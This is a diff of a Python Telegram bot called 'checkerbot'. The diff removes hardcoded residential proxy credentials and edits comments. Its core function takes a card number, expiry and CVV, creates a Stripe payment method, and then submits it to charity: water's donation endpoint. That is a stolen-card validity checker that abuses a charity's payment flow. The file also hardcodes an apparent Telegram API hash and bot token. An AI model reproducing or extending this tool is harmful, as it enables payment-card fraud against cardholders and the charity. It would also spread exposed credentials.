@@ -2,22 +2,14 @@ import re
 import aiohttp
 from pyrogram import Client, filters
 
-API_ID = 29569239
+API_ID = 29569239           # your api_id
 API_HASH = "b2407514e15f24c8ec2c735e8018acd7"
 BOT_TOKEN = "8039426526:AAFSqWU-fRl_gwTPqYLK8yxuS0N9at1hC4s"
-
-# YOUR PROXY DETAILS (use any of the three you posted)
-PROXY_HOST = "evo-pro.porterproxies.com"
-PROXY_PORT = 61236
-PROXY_USER = "PP_D4F1YGPKC1-country-US"
-PROXY_PASS = "omf4xz27"
-
-PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
 
 app = Client("checkerbot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
 async def stripe_charitywater_check(cc, mm, yy, cvv):
-    # Stripe call
+    # 1st request to Stripe
     headers1 = {
         'authority': 'api.stripe.com',
         'accept': 'application/json',
@@ -32,7 +24,6 @@ async def stripe_charitywater_check(cc, mm, yy, cvv):
                 'https://api.stripe.com/v1/payment_methods',
                 headers=headers1,
                 data=data1,
-                proxy=PROXY_URL,
                 timeout=30
             ) as resp:
                 op = await resp.json()
@@ -43,7 +34,7 @@ async def stripe_charitywater_check(cc, mm, yy, cvv):
     except Exception as e:
         return f"❌ Stripe Error: {e}"
 
-    # CharityWater call
+    # 2nd request to CharityWater
     headers2 = {
         'authority': 'www.charitywater.org',
         'accept': '*/*',
@@ -78,7 +69,6 @@ async def stripe_charitywater_check(cc, mm, yy, cvv):
                 'https://www.charitywater.org/donate/stripe',
                 headers=headers2,
                 data=data2,
-                proxy=PROXY_URL,
                 timeout=30
             ) as resp:
                 status = resp.status
